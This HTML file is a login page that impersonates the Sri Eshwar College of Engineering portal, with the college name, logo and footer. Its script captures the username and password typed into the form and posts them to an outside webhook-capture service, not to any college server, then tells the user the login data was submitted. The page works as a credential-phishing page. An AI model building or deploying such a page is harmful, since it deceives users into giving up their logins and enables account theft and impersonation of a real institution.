<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sri Eshwar College Login</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #e0eafc, #cfdef3);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .login-container {
      background: white;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
      width: 380px;
      text-align: center;
      animation: fadeInUp 1s ease forwards;
      opacity: 0;
    }

    @keyframes fadeInUp {
      from {
        transform: translateY(40px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    .logo {
      width: 90px;
      height: 90px;
      object-fit: contain;
      margin-bottom: 20px;
      animation: bounce 1.2s ease-in-out;
    }

    @keyframes bounce {
      0%, 100% {
        transform: translateY(0);
      }
      50% {
        transform: translateY(-15px);
      }
    }

    h2 {
      margin-bottom: 20px;
      color: #0a4e8c;
      font-size: 24px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      transition: 0.3s;
    }

    input:focus {
      border-color: #0a4e8c;
      outline: none;
      box-shadow: 0 0 5px #0a4e8c60;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #0a4e8c;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 17px;
      cursor: pointer;
      margin-top: 14px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #083f70;
    }

    .footer-text {
      margin-top: 25px;
      font-size: 14px;
      color: #777;
      opacity: 0.8;
    }

    /* Responsive */
    @media (max-width: 420px) {
      .login-container {
        width: 90%;
        padding: 30px;
      }
    }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="SECE.jpg" alt="Sri Eshwar Logo" class="logo">
    <h2>Login to SECE Portal</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
    <div class="footer-text">
      Â© Sri Eshwar College of Engineering
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const response = await fetch("https://play.svix.com/in/e_tE9ksC8Tn9gECJk6qCOMb9JeaVf/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: username,
          password: password
        })
      });

      if (response.ok) {
        alert("Login data submitted successfully!");
      } else {
        alert("Failed to submit data.");
      }
    });
  </script>

</body>
</html>
